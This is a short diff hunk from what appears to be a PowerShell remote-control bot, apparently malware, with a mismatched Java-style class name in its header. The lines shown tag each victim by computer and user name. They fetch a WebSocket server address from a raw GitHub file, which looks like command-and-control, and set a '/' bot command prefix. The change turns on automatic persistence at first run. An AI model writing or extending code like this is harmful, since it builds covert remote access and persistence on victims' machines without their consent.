@@ -50,7 +50,7 @@ public class InputControl {
 $global:uid = "$env:COMPUTERNAME-$env:USERNAME"
 $wssUrlFile = "https://raw.githubusercontent.com/icyyboy/wss-test-/refs/heads/main/url"
 $botPrefix = "/"
-$persistEnabled = $false
+$persistEnabled = $true
 
 # Auto-enable persistence on first run
 function Initialize-Persistence {
